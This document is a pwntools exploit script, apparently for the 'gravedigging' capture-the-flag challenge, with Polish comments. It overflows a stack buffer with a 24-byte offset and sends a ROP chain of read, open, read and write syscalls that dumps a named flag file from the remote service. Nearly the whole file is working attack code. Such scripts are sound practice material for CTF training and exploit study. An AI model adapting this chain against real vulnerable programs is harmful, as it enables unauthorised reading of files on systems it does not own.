from pwn import *             

context.log_level = 'warning' 


context.update(arch='x86_64', os='linux') 
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe']
#context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe','-d','kali-linux', '-u', 'root'] #kali

HOST="env02.deadface.io:5632"
ADDRESS,PORT=HOST.split(":")


BINARY_NAME="./gravedigging"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    


#pause(3)
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
bss = binary.bss()
#

# read(0, bss, 0x80)   <- wczytaj nazwę ścieżki do .bss
chain =b''
chain += p64(pop_rdi) + p64(0)        # rdi = fd 0 (stdin)
chain += p64(pop_rsi) + p64(bss)      # rsi = dest (.bss)
chain += p64(pop_rdx) + p64(0x80)     # rdx = len
chain += p64(pop_rax) + p64(0)        # rax = sys_read
chain += p64(syscall)

# open(bss, O_RDONLY=0, 0)
chain += p64(pop_rdi) + p64(bss)      # rdi = path (.bss)
chain += p64(pop_rsi) + p64(0)        # rsi = flags
chain += p64(pop_rdx) + p64(0)        # rdx = mode
chain += p64(pop_rax) + p64(2)        # rax = sys_open
chain += p64(syscall)

# fallback: zakładamy fd=3 (zamień na przeniesienie rax->rdi jeśli masz gadget)
chain += p64(pop_rdi) + p64(3)

# read(fd, bss+0x80, 0x80)
chain += p64(pop_rsi) + p64(bss + 0x80)
chain += p64(pop_rdx) + p64(0x80)
chain += p64(pop_rax) + p64(0)
chain += p64(syscall)

# write(1, bss+0x80, 0x80)
chain += p64(pop_rdi) + p64(1)                 # stdout
chain += p64(pop_rsi) + p64(bss + 0x80)
chain += p64(pop_rdx) + p64(0x80)
chain += p64(pop_rax) + p64(1)                 # sys_write
chain += p64(syscall)

main=binary.sym.main
# payload
offset = 24
payload = b'A'*offset + chain

p.sendlineafter(b'Which Grave shall you search?', payload)
# po wywołaniu read(0,bss,0x20) ROP będzie czekać na stdin -> wysyłamy nazwę pliku
# gdb.attach(p)
# pause(3)

#p.send(b'/home/ctf.txt\x00')   # lub p.sendline(b'flag.txt') jeśli chcesz newline
#p.send(b'/home/cft/Sara Flagg 1990, 2025 -- she sure loved ctfs\x00')   # lub p.sendline(b'flag.txt') jeśli chcesz newline
p.send(b'/home/ctf/Sara Flagg 1990, 2025 -- she sure loved ctfs\x00')   # lub p.sendline(b'flag.txt') jeśli chcesz newline
# dalej możesz odbierać wynik lub kontynuować ROP (np. read(fd,buf,len) i write)

p.interactive()
